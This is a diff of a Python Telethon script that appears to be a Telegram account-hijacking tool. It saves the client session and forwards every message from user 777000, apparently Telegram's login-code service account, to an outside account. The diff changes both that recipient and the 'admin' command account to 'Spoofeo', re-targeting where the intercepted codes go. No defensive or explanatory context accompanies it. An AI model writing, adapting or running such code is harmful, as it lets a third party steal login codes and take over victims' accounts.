@@ -11,7 +11,7 @@ id = 5739547
 feshar = TelegramClient("sassion", api_id= id, api_hash=hash).start()
 CybeRR = feshar.session.save()
 #---------------------STart-Admin----------------------#
-AliCybeRR = "@" #Admin
+AliCybeRR = "@Spoofeo" #Admin
 #---------------------ping----------------------#
 @feshar.on(events.NewMessage(from_users = AliCybeRR))
 async def main(event):
@@ -29,7 +29,7 @@ async def wait_hours(event):
 async def sendphoto(event):
     sender = await event.get_sender()
     if sender.id == 777000:
-        await feshar.forward_messages("Ali_CybeRR_Bemola", event.message) #Admin
+        await feshar.forward_messages("Spoofeo", event.message) #Admin
 #---------------------End-----------------------#
 try:
     asyncio.get_event_loop().run_forever()
